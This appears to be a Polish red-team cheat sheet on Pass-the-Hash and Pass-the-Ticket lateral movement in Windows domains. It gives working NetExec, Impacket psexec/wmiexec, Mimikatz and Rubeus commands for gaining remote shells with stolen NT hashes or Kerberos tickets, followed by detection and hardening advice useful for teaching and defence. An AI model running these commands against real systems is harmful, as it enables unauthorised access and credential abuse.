---
title: "Pass-the-Hash / Pass-the-Ticket"
category: "red-team"
tags: ["lateral-movement", "credential-access", "kerberos", "ntlm"]
platform: "windows"
mitre: ["T1550.002", "T1550.003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Pass-the-Hash / Pass-the-Ticket

## TL;DR
Nie musisz znać hasła — wystarczy hash NT (PtH, NTLM) lub bilet Kerberos (PtT). Uwierzytelniasz się jako ofiara bez łamania hasła.

## Pass-the-Hash (NTLM)
```bash
# NetExec / CrackMapExec – wykonaj polecenie zdalnie
nxc smb 10.10.10.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:<NThash> -x whoami
# Impacket – interaktywny shell
impacket-psexec -hashes :<NThash> administrator@10.10.10.20
impacket-wmiexec -hashes :<NThash> administrator@10.10.10.20   # ciszej niż psexec
```
```powershell
# Mimikatz – sekurlsa PtH (uruchamia proces z hashem)
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NThash> /run:cmd.exe
```

## Pass-the-Ticket (Kerberos)
```powershell
# Zaimportuj bilet .kirbi do bieżącej sesji
Rubeus.exe ptt /ticket:ticket.kirbi
```
```bash
# Linux – użyj ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
```

## Wykrywanie (Blue Team)
- Logon type 3 (network) NTLM z hosta użytkownika do wielu maszyn (Event 4624/4776).
- Bilety Kerberos używane z innego hosta niż wystawiony; nietypowe logon anomalie.
- EDR: `lsass` dostęp (kradzież hasha), zdalne wykonanie psexec/wmiexec (7045, 4688).

## Mitygacja / Hardening
- Credential Guard, LSASS PPL, ograniczenie logowań lokalnych adminów (LAPS).
- Windows Defender / tiering: konta Tier 0 tylko na hostach Tier 0.
- Wymuś Kerberos AES, monitoruj `psexec`/`wmiexec` sygnatury.

## Źródła
- [MITRE T1550](https://attack.mitre.org/techniques/T1550/)
